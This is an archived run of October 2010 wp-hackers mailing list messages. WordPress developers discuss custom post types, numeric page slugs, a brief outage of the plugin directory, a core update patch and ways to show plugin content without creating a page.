> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jimmy.roy at gmail.com  Tue Oct 26 04:53:17 2010
From: jimmy.roy at gmail.com (Jimmy Roy)
Date: Tue, 26 Oct 2010 12:53:17 +0800
Subject: [wp-hackers] automatic taxonomy update after add a new custom
 post type
In-Reply-To: <AANLkTinM68=B28d9Emmvn8+6ZkiiQzxfin1+q21xus9C@mail.gmail.com>
References: <AANLkTinF8_pmQo61WWLqSNv7k0QGqCRGTskOkV7g68jY@mail.gmail.com>
	<AANLkTikpOsw7KrsphtxD4-Y1RdxgV1gCG73AidHFgMFG@mail.gmail.com>
	<AANLkTinM68=B28d9Emmvn8+6ZkiiQzxfin1+q21xus9C@mail.gmail.com>
Message-ID: <AANLkTikSiRmAK=N9JN_j3K=V6UZQa55cP=robexvbrRP@mail.gmail.com>

hi Scribu,
it works perfectly in admin.
now I will see how display on front end.

thank u!

Jimmt



2010/10/25 scribu <mail at scribu.net>

> On Mon, Oct 25, 2010 at 5:08 AM, Jimmy Roy <jimmy.roy at gmail.com> wrote:
>
> > hi guys,
> >
> > I work on a new project and in this project I have 3 custom post types:
> >
> >   - book
> >   - translator automatically
> >   - editor
> >
> > until now everything is easy.
> >
> > now it's more complicated, a book is edited by an editor and translated
> by
> > a
> > translator so when I add a new book I would like to select translator and
> > editor in a custom taxonomy (taxo-translator and taxo-editor).
> >
> > these 2 custom taxonomies are filled when I add a new translator (custom
> > post type) and a new editor (custom post type)... actually it's what I
> want
> > to do... but is it possible and how to do that?
> >
> > an action hook after the creation of the custom post type ? how to get
> name
> > and id?
> >
> > I'm not sure if I can do it easily with WP...
> >
>
> I think you should try the Posts 2 Posts plugin, instead of trying to map a
> post to a taxonomy term:
>
> http://wordpress.org/extend/plugins/posts-to-posts/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From steve at sltaylor.co.uk  Tue Oct 26 13:25:17 2010
From: steve at sltaylor.co.uk (Steve Taylor)
Date: Tue, 26 Oct 2010 14:25:17 +0100
Subject: [wp-hackers] page(\d+) slugs
Message-ID: <AANLkTinrxmxEtuHBErDv-yjScgCG9W6mGnEsyeuKwWDP@mail.gmail.com>

A client's site has just broken in a major way and I've tracked it
down to a change in WP 3. Line 2561 in /wp-includes/post.php:

if ( $post_name_check || in_array( $slug, $feeds ) || preg_match(
'@^(page)?\d+$@', $slug ) ) {

It's the last condition. My client's site has sections for different
conferences they run, and each conference year's landing page has a
slug set to the year of the conference, e.g. "2010". The whole system
is based on this, and it was working fine. Now when they update a
landing page, the numerical slug isn't allowed, and gets set to
something like "2010-2".

I can't find the Trac ticket to explain this. Are numerical slugs now
not allowed?

For now I'm having to hack post.php, but obviously I'd like to find a
better solution (which doesn't involve recoding my client's site!).

cheers,

Steve

From jon at lionsgoroar.co.uk  Tue Oct 26 15:09:33 2010
From: jon at lionsgoroar.co.uk (Jon Cave)
Date: Tue, 26 Oct 2010 16:09:33 +0100
Subject: [wp-hackers] page(\d+) slugs
In-Reply-To: <AANLkTinrxmxEtuHBErDv-yjScgCG9W6mGnEsyeuKwWDP@mail.gmail.com>
References: <AANLkTinrxmxEtuHBErDv-yjScgCG9W6mGnEsyeuKwWDP@mail.gmail.com>
Message-ID: <AANLkTimKFraD42qj=KpXHTcPdqSLnR+3VGg7vZQ9QDsL@mail.gmail.com>

On Tue, Oct 26, 2010 at 2:25 PM, Steve Taylor <steve at sltaylor.co.uk> wrote:
> I can't find the Trac ticket to explain this. Are numerical slugs now
> not allowed?

Trac ticket here: http://core.trac.wordpress.org/ticket/14238

From navjotjsingh at gmail.com  Tue Oct 26 15:12:09 2010
From: navjotjsingh at gmail.com (Navjot Singh)
Date: Tue, 26 Oct 2010 20:42:09 +0530
Subject: [wp-hackers] Permission problems in Custom post type
In-Reply-To: <AANLkTimVXTCT1NzWn5oLnjf5Ef0Q17Yy0WmqMHnEV5Cg@mail.gmail.com>
References: <AANLkTimVXTCT1NzWn5oLnjf5Ef0Q17Yy0WmqMHnEV5Cg@mail.gmail.com>
Message-ID: <AANLkTimPQBH71y2S1bTveVhDPj3dT-yGBQ5VJg5yABEq@mail.gmail.com>

I am using this code for adding a custom post type

add_action( 'init', 'go_post_types' );

function go_post_types() {
    register_post_type( 'videos',
        array(
            'labels' => array(
                'name' => __( 'Videos' ),
                'singular_name' => __( 'Video' ),
            ),
            'description' => __( 'Video type posts are used to post Videos
to GO site.' ),
            'public' => true,
            'show_ui' => true,
            'publicly_queryable' => true,
            'exclude_from_search' => false,
            '_builtin' => false,
            'menu_position' => 5,
            'menu_icon' => get_stylesheet_directory_uri() .
'/images/videoicon.png',
            'hierarchical' => false,
            'capability_type' => 'post',
            'supports' => array( 'title', 'editor', 'revisions', 'author',
'excerpt', 'custom-fields', 'thumbnail' ),
            'rewrite' => array( 'slug' => 'videos'),
            'can_export' => true,
        )
    );
    register_taxonomy("video-type", array("videos"), array("hierarchical" =>
true, "label" => "Video Type", "rewrite" => true));
}
?>

One or two days back everything was fine but today when I logged in, I could
not edit any published video type. Now I can only add videos but not edit
them. Seems some recent Trunk changeset caused the problem. I update the
blog once a day via SVN.

Can't figure out why its like this.

Regards
Navjot Singh

From dvmorris at gmail.com  Tue Oct 26 15:52:45 2010
From: dvmorris at gmail.com (David Morris)
Date: Tue, 26 Oct 2010 10:52:45 -0500
Subject: [wp-hackers] Limit the_category output to X categories
Message-ID: <AANLkTinTFKqENXkqM=K0ymy6Eah1aRJqp1EWbZb8aOg8@mail.gmail.com>

Is there a way to limit the number of categories output by the_category() to
the first X categories?

Thanks,
Dave

From dvmorris at gmail.com  Tue Oct 26 17:06:28 2010
From: dvmorris at gmail.com (David Morris)
Date: Tue, 26 Oct 2010 12:06:28 -0500
Subject: [wp-hackers] Limit the_category output to X categories
In-Reply-To: <AANLkTinTFKqENXkqM=K0ymy6Eah1aRJqp1EWbZb8aOg8@mail.gmail.com>
References: <AANLkTinTFKqENXkqM=K0ymy6Eah1aRJqp1EWbZb8aOg8@mail.gmail.com>
Message-ID: <AANLkTima10sy9C9-ihJEYSLo8KVncDV0++APUm0DsjbW@mail.gmail.com>

Nevermind, I think I figured it out. I just hooked the_category filter and
did my own custom loop. It would be nice if those category output functions
took a limit parameter, though.

Dave

On Tue, Oct 26, 2010 at 10:52 AM, David Morris <dvmorris at gmail.com> wrote:

> Is there a way to limit the number of categories output by the_category()
> to the first X categories?
>
> Thanks,
> Dave
>



-- 
Dave Morris
http://dave.showviz.net/
http://3dcamphouston.com/

From e at leau.net  Tue Oct 26 20:18:06 2010
From: e at leau.net (Edward de Leau)
Date: Tue, 26 Oct 2010 22:18:06 +0200
Subject: [wp-hackers] wordpress.org plugin directory bug or hacked
Message-ID: <AANLkTinuKYFrtqi-HbWNvPMVGsg5Qxw95+ABy43oJEi7@mail.gmail.com>

When I head to the wordpress.org plugin directory and click the tags, i only get
to see 2 plugins:

-?Livefyre Realtime Comments
- Blog Protector Final - Protect Your Content

?

--
Edward de Leau
http://populair.eu

From elfin at elfden.co.uk  Tue Oct 26 20:26:49 2010
From: elfin at elfden.co.uk (Rich Pedley)
Date: Tue, 26 Oct 2010 21:26:49 +0100
Subject: [wp-hackers] wordpress.org plugin directory bug or hacked
In-Reply-To: <AANLkTinuKYFrtqi-HbWNvPMVGsg5Qxw95+ABy43oJEi7@mail.gmail.com>
References: <AANLkTinuKYFrtqi-HbWNvPMVGsg5Qxw95+ABy43oJEi7@mail.gmail.com>
Message-ID: <4CC73989.4040502@elfden.co.uk>

On 26/10/2010 21:18, Edward de Leau wrote:
> When I head to the wordpress.org plugin directory and click the tags, i only get
> to see 2 plugins:
>
> - Livefyre Realtime Comments
> - Blog Protector Final - Protect Your Content
>
> ?

http://wordpress.org/extend/plugins/browse/no-replies/

interesting... and looks like plugin pages are currently down as well.

Rich

From e at leau.net  Tue Oct 26 20:30:24 2010
From: e at leau.net (Edward de Leau)
Date: Tue, 26 Oct 2010 22:30:24 +0200
Subject: [wp-hackers] wordpress.org plugin directory bug or hacked
In-Reply-To: <4CC73989.4040502@elfden.co.uk>
References: <AANLkTinuKYFrtqi-HbWNvPMVGsg5Qxw95+ABy43oJEi7@mail.gmail.com>
	<4CC73989.4040502@elfden.co.uk>
Message-ID: <AANLkTi=N=y0ZBvnX4GwAZiFyjVhmwO+0chi3H-z81z8h@mail.gmail.com>

Thanks for confirming this, saves time checking my own .host file /
dns redirection grin

On Tue, Oct 26, 2010 at 10:26 PM, Rich Pedley <elfin at elfden.co.uk> wrote:
> On 26/10/2010 21:18, Edward de Leau wrote:
>>
>> When I head to the wordpress.org plugin directory and click the tags, i
>> only get
>> to see 2 plugins:
>>
>> - Livefyre Realtime Comments
>> - Blog Protector Final - Protect Your Content
>>
>> ?
>
> http://wordpress.org/extend/plugins/browse/no-replies/
>
> interesting... and looks like plugin pages are currently down as well.
>
> Rich
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Edward de Leau
http://populair.eu

From wp at andrewnacin.com  Tue Oct 26 20:30:25 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Tue, 26 Oct 2010 16:30:25 -0400
Subject: [wp-hackers] wordpress.org plugin directory bug or hacked
In-Reply-To: <AANLkTinuKYFrtqi-HbWNvPMVGsg5Qxw95+ABy43oJEi7@mail.gmail.com>
References: <AANLkTinuKYFrtqi-HbWNvPMVGsg5Qxw95+ABy43oJEi7@mail.gmail.com>
Message-ID: <AANLkTik+h4rMK=CJyP8sN5JH++rwh3cYuAngDAmiYjxU@mail.gmail.com>

On Tue, Oct 26, 2010 at 4:18 PM, Edward de Leau <e at leau.net> wrote:

> When I head to the wordpress.org plugin directory and click the tags, i
> only get
> to see 2 plugins:
>
> - Livefyre Realtime Comments
> - Blog Protector Final - Protect Your Content
>
> ?


Not hacked. Bug is being investigated.

From wp at andrewnacin.com  Tue Oct 26 20:41:59 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Tue, 26 Oct 2010 16:41:59 -0400
Subject: [wp-hackers] wordpress.org plugin directory bug or hacked
In-Reply-To: <AANLkTik+h4rMK=CJyP8sN5JH++rwh3cYuAngDAmiYjxU@mail.gmail.com>
References: <AANLkTinuKYFrtqi-HbWNvPMVGsg5Qxw95+ABy43oJEi7@mail.gmail.com>
	<AANLkTik+h4rMK=CJyP8sN5JH++rwh3cYuAngDAmiYjxU@mail.gmail.com>
Message-ID: <AANLkTimGAuE3Hg5ufN2pESuTgoyq-EtETJ2xp_GivfRq@mail.gmail.com>

On Tue, Oct 26, 2010 at 4:30 PM, Andrew Nacin <wp at andrewnacin.com> wrote:

> On Tue, Oct 26, 2010 at 4:18 PM, Edward de Leau <e at leau.net> wrote:
>
>> When I head to the wordpress.org plugin directory and click the tags, i
>> only get
>> to see 2 plugins:
>>
>> - Livefyre Realtime Comments
>> - Blog Protector Final - Protect Your Content
>>
>> ?
>
>
> Not hacked. Bug is being investigated.
>

Back up.

http://wordpress.org/extend/plugins/

From elfin at elfden.co.uk  Tue Oct 26 21:08:25 2010
From: elfin at elfden.co.uk (Rich Pedley)
Date: Tue, 26 Oct 2010 22:08:25 +0100
Subject: [wp-hackers] wordpress.org plugin directory bug or hacked
In-Reply-To: <AANLkTimGAuE3Hg5ufN2pESuTgoyq-EtETJ2xp_GivfRq@mail.gmail.com>
References: <AANLkTinuKYFrtqi-HbWNvPMVGsg5Qxw95+ABy43oJEi7@mail.gmail.com>	<AANLkTik+h4rMK=CJyP8sN5JH++rwh3cYuAngDAmiYjxU@mail.gmail.com>
	<AANLkTimGAuE3Hg5ufN2pESuTgoyq-EtETJ2xp_GivfRq@mail.gmail.com>
Message-ID: <4CC74349.7050304@elfden.co.uk>

On 26/10/2010 21:41, Andrew Nacin wrote:
> On Tue, Oct 26, 2010 at 4:30 PM, Andrew Nacin<wp at andrewnacin.com>  wrote:
>
>> On Tue, Oct 26, 2010 at 4:18 PM, Edward de Leau<e at leau.net>  wrote:
>>
>>> When I head to the wordpress.org plugin directory and click the tags, i
>>> only get
>>> to see 2 plugins:
>>>
>>> - Livefyre Realtime Comments
>>> - Blog Protector Final - Protect Your Content
>>>
>>> ?
>>
>>
>> Not hacked. Bug is being investigated.
>>
>
> Back up.
>
> http://wordpress.org/extend/plugins/

good news, thanks.

Rich

From e at leau.net  Tue Oct 26 22:03:44 2010
From: e at leau.net (Edward de Leau)
Date: Wed, 27 Oct 2010 00:03:44 +0200
Subject: [wp-hackers] wordpress.org plugin directory bug or hacked
In-Reply-To: <4CC74349.7050304@elfden.co.uk>
References: <AANLkTinuKYFrtqi-HbWNvPMVGsg5Qxw95+ABy43oJEi7@mail.gmail.com>
	<AANLkTik+h4rMK=CJyP8sN5JH++rwh3cYuAngDAmiYjxU@mail.gmail.com>
	<AANLkTimGAuE3Hg5ufN2pESuTgoyq-EtETJ2xp_GivfRq@mail.gmail.com>
	<4CC74349.7050304@elfden.co.uk>
Message-ID: <AANLkTikav8BkSGQ1bfMErN6LaUO5hfz8vW6XbCJC7pEp@mail.gmail.com>

I dont know if it is related but if I now try to install a plugin /
update a plugin i get:
Incompatible Archive. PCLZIP_ERR_BAD_FORMAT (-10) : Unable to find End
of Central Dir Record signature


On Tue, Oct 26, 2010 at 11:08 PM, Rich Pedley <elfin at elfden.co.uk> wrote:
> On 26/10/2010 21:41, Andrew Nacin wrote:
>>
>> On Tue, Oct 26, 2010 at 4:30 PM, Andrew Nacin<wp at andrewnacin.com> ?wrote:
>>
>>> On Tue, Oct 26, 2010 at 4:18 PM, Edward de Leau<e at leau.net> ?wrote:
>>>
>>>> When I head to the wordpress.org plugin directory and click the tags, i
>>>> only get
>>>> to see 2 plugins:
>>>>
>>>> - Livefyre Realtime Comments
>>>> - Blog Protector Final - Protect Your Content
>>>>
>>>> ?
>>>
>>>
>>> Not hacked. Bug is being investigated.
>>>
>>
>> Back up.
>>
>> http://wordpress.org/extend/plugins/
>
> good news, thanks.
>
> Rich
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Edward de Leau
http://populair.eu

From notfornoone at gmail.com  Tue Oct 26 22:11:28 2010
From: notfornoone at gmail.com (ampt)
Date: Wed, 27 Oct 2010 09:11:28 +1100
Subject: [wp-hackers] action patch for update-core.php
Message-ID: <AANLkTinOByTpQGJHhV0McAAeWFY3Kd1J6GoeC3eUn6OG@mail.gmail.com>

While playing with the hooks in /wp-admin/update-core.php I noticed
that the logic probably should be something similar to
/wp-admin/update.php which allows unrecognised actions to pass
through.
http://core.trac.wordpress.org/ticket/15221

thanks,

ampt

From wp at andrewnacin.com  Tue Oct 26 22:18:47 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Tue, 26 Oct 2010 18:18:47 -0400
Subject: [wp-hackers] wordpress.org plugin directory bug or hacked
In-Reply-To: <AANLkTikav8BkSGQ1bfMErN6LaUO5hfz8vW6XbCJC7pEp@mail.gmail.com>
References: <AANLkTinuKYFrtqi-HbWNvPMVGsg5Qxw95+ABy43oJEi7@mail.gmail.com>
	<AANLkTik+h4rMK=CJyP8sN5JH++rwh3cYuAngDAmiYjxU@mail.gmail.com>
	<AANLkTimGAuE3Hg5ufN2pESuTgoyq-EtETJ2xp_GivfRq@mail.gmail.com>
	<4CC74349.7050304@elfden.co.uk>
	<AANLkTikav8BkSGQ1bfMErN6LaUO5hfz8vW6XbCJC7pEp@mail.gmail.com>
Message-ID: <AANLkTimSyY4Y7PBrqAtVvgCgokEi_ry7521Pdsqk6PJZ@mail.gmail.com>

On Tue, Oct 26, 2010 at 6:03 PM, Edward de Leau <e at leau.net> wrote:

> I dont know if it is related but if I now try to install a plugin /
> update a plugin i get:
> Incompatible Archive. PCLZIP_ERR_BAD_FORMAT (-10) : Unable to find End
> of Central Dir Record signature


Unrelated -- which plugin and version?

From e at leau.net  Tue Oct 26 22:22:10 2010
From: e at leau.net (Edward de Leau)
Date: Wed, 27 Oct 2010 00:22:10 +0200
Subject: [wp-hackers] wordpress.org plugin directory bug or hacked
In-Reply-To: <AANLkTimSyY4Y7PBrqAtVvgCgokEi_ry7521Pdsqk6PJZ@mail.gmail.com>
References: <AANLkTinuKYFrtqi-HbWNvPMVGsg5Qxw95+ABy43oJEi7@mail.gmail.com>
	<AANLkTik+h4rMK=CJyP8sN5JH++rwh3cYuAngDAmiYjxU@mail.gmail.com>
	<AANLkTimGAuE3Hg5ufN2pESuTgoyq-EtETJ2xp_GivfRq@mail.gmail.com>
	<4CC74349.7050304@elfden.co.uk>
	<AANLkTikav8BkSGQ1bfMErN6LaUO5hfz8vW6XbCJC7pEp@mail.gmail.com>
	<AANLkTimSyY4Y7PBrqAtVvgCgokEi_ry7521Pdsqk6PJZ@mail.gmail.com>
Message-ID: <AANLkTinL6AwKd9oqXHjwncezud-+kvzb=r1f2SNF=X_r@mail.gmail.com>

with ALL - but... they now all update (and 1 new) without errors.
(without any changes)

On Wed, Oct 27, 2010 at 12:18 AM, Andrew Nacin <wp at andrewnacin.com> wrote:
> On Tue, Oct 26, 2010 at 6:03 PM, Edward de Leau <e at leau.net> wrote:
>
>> I dont know if it is related but if I now try to install a plugin /
>> update a plugin i get:
>> Incompatible Archive. PCLZIP_ERR_BAD_FORMAT (-10) : Unable to find End
>> of Central Dir Record signature
>
>
> Unrelated -- which plugin and version?
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Edward de Leau
http://populair.eu

From notfornoone at gmail.com  Tue Oct 26 23:29:03 2010
From: notfornoone at gmail.com (ampt)
Date: Wed, 27 Oct 2010 10:29:03 +1100
Subject: [wp-hackers]  action patch for update-core.php
In-Reply-To: <AANLkTinOByTpQGJHhV0McAAeWFY3Kd1J6GoeC3eUn6OG@mail.gmail.com>
References: <AANLkTinOByTpQGJHhV0McAAeWFY3Kd1J6GoeC3eUn6OG@mail.gmail.com>
Message-ID: <AANLkTinMGUCamRiucMrYPtZxd0VOU_+qJK8ZXUd5BxpD@mail.gmail.com>

sorry, forgot to ask is there any reason why this patch would not apply?

thanks,

ampt

On 27 October 2010 09:11, ampt <notfornoone at gmail.com> wrote:
> While playing with the hooks in /wp-admin/update-core.php I noticed
> that the logic probably should be something similar to
> /wp-admin/update.php which allows unrecognised actions to pass
> through.
> http://core.trac.wordpress.org/ticket/15221
>
> thanks,
>
> ampt
>

From steve at sltaylor.co.uk  Tue Oct 26 23:40:21 2010
From: steve at sltaylor.co.uk (Steve Taylor)
Date: Wed, 27 Oct 2010 00:40:21 +0100
Subject: [wp-hackers] page(\d+) slugs
In-Reply-To: <AANLkTimKFraD42qj=KpXHTcPdqSLnR+3VGg7vZQ9QDsL@mail.gmail.com>
References: <AANLkTinrxmxEtuHBErDv-yjScgCG9W6mGnEsyeuKwWDP@mail.gmail.com>
	<AANLkTimKFraD42qj=KpXHTcPdqSLnR+3VGg7vZQ9QDsL@mail.gmail.com>
Message-ID: <AANLkTintf00_KEQj4QELErDCv7Xd=t+ZyzSCwsRowH0-@mail.gmail.com>

Thanks Jon. I was thinking of the ticket where the preg_match was
added, to appreciate why this happened - heartening to see there's a
ticket about the problems it's causing.


On 26 October 2010 16:09, Jon Cave <jon at lionsgoroar.co.uk> wrote:
> On Tue, Oct 26, 2010 at 2:25 PM, Steve Taylor <steve at sltaylor.co.uk> wrote:
>> I can't find the Trac ticket to explain this. Are numerical slugs now
>> not allowed?
>
> Trac ticket here: http://core.trac.wordpress.org/ticket/14238
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wp at andrewnacin.com  Tue Oct 26 23:44:03 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Tue, 26 Oct 2010 19:44:03 -0400
Subject: [wp-hackers] page(\d+) slugs
In-Reply-To: <AANLkTintf00_KEQj4QELErDCv7Xd=t+ZyzSCwsRowH0-@mail.gmail.com>
References: <AANLkTinrxmxEtuHBErDv-yjScgCG9W6mGnEsyeuKwWDP@mail.gmail.com>
	<AANLkTimKFraD42qj=KpXHTcPdqSLnR+3VGg7vZQ9QDsL@mail.gmail.com>
	<AANLkTintf00_KEQj4QELErDCv7Xd=t+ZyzSCwsRowH0-@mail.gmail.com>
Message-ID: <AANLkTi=TiP2-Z4YNK=Cer+2HBdzmE=Twbvs0aorbZMMC@mail.gmail.com>

On Tue, Oct 26, 2010 at 7:40 PM, Steve Taylor <steve at sltaylor.co.uk> wrote:

> Thanks Jon. I was thinking of the ticket where the preg_match was
> added, to appreciate why this happened - heartening to see there's a
> ticket about the problems it's causing.


It was added because numeric slugs were broken in most instances, due to the
rewrite rule that allows for pages to be specified directly, e.g. /2 versus
/page/2.

Original ticket: http://core.trac.wordpress.org/ticket/11917.

From dino at duechiacchiere.it  Wed Oct 27 01:46:04 2010
From: dino at duechiacchiere.it (Dino Termini)
Date: Tue, 26 Oct 2010 21:46:04 -0400
Subject: [wp-hackers] Displaying a page on-the-fly with a plugin
Message-ID: <4CC7845C.8040000@duechiacchiere.it>

Hi everybody,

I'm developing a plugin that displays a page for the users with various 
options. Right now, I'm using

insert_post()

to create the page when the plugin is activated, and then 
add_filter('the_content') whose attached functions runs only if the ID 
of the current page matches the one of the page I created. Some of my 
users have pointed out that creating a new page 'clutters' their blog, 
so I was wondering if there's a different way to "load the current 
theme" and display my custom content in place of the_content(). Please 
let me know if you need more details.

Thanks,
Camu

From anthony at radiopicture.com.au  Wed Oct 27 01:56:19 2010
From: anthony at radiopicture.com.au (Anthony Cole)
Date: Wed, 27 Oct 2010 14:56:19 +1300
Subject: [wp-hackers] Displaying a page on-the-fly with a plugin
In-Reply-To: <4CC7845C.8040000@duechiacchiere.it>
References: <4CC7845C.8040000@duechiacchiere.it>
Message-ID: <7C0D6D6C-77BB-4CB7-85E5-25989D8717EE@radiopicture.com.au>

I would use a shortcode, and you could filter out the_content and replace it with do_shortcode('shortcode')  or a function, checking the Post ID through the post global.

Would be interested to see if anyone else has a suggestion.

-ac

On 27/10/2010, at 2:46 PM, Dino Termini wrote:

> Hi everybody,
> 
> I'm developing a plugin that displays a page for the users with various options. Right now, I'm using
> 
> insert_post()
> 
> to create the page when the plugin is activated, and then add_filter('the_content') whose attached functions runs only if the ID of the current page matches the one of the page I created. Some of my users have pointed out that creating a new page 'clutters' their blog, so I was wondering if there's a different way to "load the current theme" and display my custom content in place of the_content(). Please let me know if you need more details.
> 
> Thanks,
> Camu
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From dino at duechiacchiere.it  Wed Oct 27 02:00:43 2010
From: dino at duechiacchiere.it (Dino Termini)
Date: Tue, 26 Oct 2010 22:00:43 -0400
Subject: [wp-hackers] Displaying a page on-the-fly with a plugin
In-Reply-To: <7C0D6D6C-77BB-4CB7-85E5-25989D8717EE@radiopicture.com.au>
References: <4CC7845C.8040000@duechiacchiere.it>
	<7C0D6D6C-77BB-4CB7-85E5-25989D8717EE@radiopicture.com.au>
Message-ID: <4CC787CB.2000705@duechiacchiere.it>

On 10/26/2010 9:56 PM, Anthony Cole wrote:
> I would use a shortcode, and you could filter out the_content and replace it with do_shortcode('shortcode')  or a function, checking the Post ID through the post global.
>
> Would be interested to see if anyone else has a suggestion.
>
> -ac

Right, but the point is to totally avoid creating this page at all :-)

dino.

From anthony at radiopicture.com.au  Wed Oct 27 02:06:58 2010
From: anthony at radiopicture.com.au (Anthony Cole)
Date: Wed, 27 Oct 2010 15:06:58 +1300
Subject: [wp-hackers] Displaying a page on-the-fly with a plugin
In-Reply-To: <4CC787CB.2000705@duechiacchiere.it>
References: <4CC7845C.8040000@duechiacchiere.it>
	<7C0D6D6C-77BB-4CB7-85E5-25989D8717EE@radiopicture.com.au>
	<4CC787CB.2000705@duechiacchiere.it>
Message-ID: <CE457875-1F2A-4F26-8A60-A25C07A7DEBE@radiopicture.com.au>

I wouldn't see any other alternative to sticking with a page.

I mean, you could create a psuedo page and grab a query_var/rewrite if you really wanted to with a custom rewrite rule and in theory grab a page template of the current theme and set the_title and the_content up with your stuff, but it's kind of misleading to your users and could lead to other problems down the road and it could potentially become really messy.

The advantage to having a page is that people actually know that it exists and where it's located.

I'm developing an e-commerce plugin right now, and I fully intend to create all of the pages for the process (checkout, cart, payment, etc).

-ac

On 27/10/2010, at 3:00 PM, Dino Termini wrote:

> On 10/26/2010 9:56 PM, Anthony Cole wrote:
>> I would use a shortcode, and you could filter out the_content and replace it with do_shortcode('shortcode')  or a function, checking the Post ID through the post global.
>> 
>> Would be interested to see if anyone else has a suggestion.
>> 
>> -ac
> 
> Right, but the point is to totally avoid creating this page at all :-)
> 
> dino.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From wordpress at dd32.id.au  Wed Oct 27 02:16:09 2010
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Wed, 27 Oct 2010 13:16:09 +1100
Subject: [wp-hackers] Displaying a page on-the-fly with a plugin
In-Reply-To: <CE457875-1F2A-4F26-8A60-A25C07A7DEBE@radiopicture.com.au>
References: <4CC7845C.8040000@duechiacchiere.it>
	<7C0D6D6C-77BB-4CB7-85E5-25989D8717EE@radiopicture.com.au>
	<4CC787CB.2000705@duechiacchiere.it>
	<CE457875-1F2A-4F26-8A60-A25C07A7DEBE@radiopicture.com.au>
Message-ID: <AANLkTimDbskvQ=nDGVkKwMRfJLgPvJ9ZCWTz682F_zs6@mail.gmail.com>

Here's how I'd do it in a plugin if the page had to be transparent.
http://wordpress.pastebin.com/xd0QmvNH
Note, That i've pastebin'd it due to sheer length of the fake post object.
It's a 5 minute job, needs optimizing and all that..

On 27 October 2010 13:06, Anthony Cole <anthony at radiopicture.com.au> wrote:

> I wouldn't see any other alternative to sticking with a page.
>
> I mean, you could create a psuedo page and grab a query_var/rewrite if you
> really wanted to with a custom rewrite rule and in theory grab a page
> template of the current theme and set the_title and the_content up with your
> stuff, but it's kind of misleading to your users and could lead to other
> problems down the road and it could potentially become really messy.
>
> The advantage to having a page is that people actually know that it exists
> and where it's located.
>
> I'm developing an e-commerce plugin right now, and I fully intend to create
> all of the pages for the process (checkout, cart, payment, etc).
>
> -ac
>
> On 27/10/2010, at 3:00 PM, Dino Termini wrote:
>
> > On 10/26/2010 9:56 PM, Anthony Cole wrote:
> >> I would use a shortcode, and you could filter out the_content and
> replace it with do_shortcode('shortcode')  or a function, checking the Post
> ID through the post global.
> >>
> >> Would be interested to see if anyone else has a suggestion.
> >>
> >> -ac
> >
> > Right, but the point is to totally avoid creating this page at all :-)
> >
> > dino.
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mark at simplercomputing.net  Wed Oct 27 02:44:14 2010
From: mark at simplercomputing.net (Mark E)
Date: Tue, 26 Oct 2010 20:44:14 -0600
Subject: [wp-hackers] Displaying a page on-the-fly with a plugin
In-Reply-To: <4CC7845C.8040000@duechiacchiere.it>
References: <4CC7845C.8040000@duechiacchiere.it>
Message-ID: <4CC791FE.7070503@simplercomputing.net>



On 10/26/2010 07:46 PM, Dino Termini wrote:

> Some of my users have pointed out that creating a new page 'clutters' their blog,

Wow. Clutters their blog eh? I gotta wonder what they use it for if not 
for publishing content, and I also have to wonder how much time they 
spend staring at the Pages section of the admin backend.



From jayarjo at gmail.com  Wed Oct 27 05:18:37 2010
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Wed, 27 Oct 2010 09:18:37 +0400
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <C8EB0F93.D0A9%emoya@tribune.com>
References: <AANLkTikd-fqgY1hUcqZ=8TJEA87ZF3HbwaQOo-RtkKmS@mail.gmail.com>
	<C8EB0F93.D0A9%emoya@tribune.com>
Message-ID: <AANLkTin9QuAp48n6Z3F+qteBDtMSAtwXSQaHQadPRM_v@mail.gmail.com>

Woa, I didn't know there were any eggs in WordPress... Is there an egg
that doesn't show 2010 posts in the admin? 'cause that what happened
to my client :D

On Mon, Oct 25, 2010 at 7:42 PM, Moya, Eddie <emoya at tribune.com> wrote:
> On 10/24/10 4:24 PM, "Eric Mann" <eric at eam.me> wrote:
>
> For the sake of argument, why don't we come up with a list of these
> "additional" features that developers might need to turn off for clients,
> bundle the code into a drop-in (as opposed to a plug-in), and allow
> ? ? ? ? developers who need it to just deploy it on their sites?
>
> +1
>
> I just added your code to a plugin I had already written to remove the capital_P_dangit egg. I renamed the plugin "Disable All Easter Eggs". That said, I don't know of any other relevant ?easter eggs than the two I just mentioned. A quick google search did not turn up any more eggs that seem to be up-to-date.
>
> If anyone knows of ANY others than the two I just mentioned, please bring it up here so we can figure out a way to turn them off via a plugin.
>
> There needs to be a simple way for people who don't know what a hook is, how to write javascript, can turn these off. Maybe if I care enough, at some point it could have a little interface so you can chose which ones to turn on or off - but for now, they will all get turned off. But if I don't get any feedback, 'All' will constitute just these two.
>
> This is the very least we can do, and possibly the only thing that can be done.
>
>
> --
> Eddie Moya
> Applications Developer
> Tribune Technology
>
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Davit Barbakadze

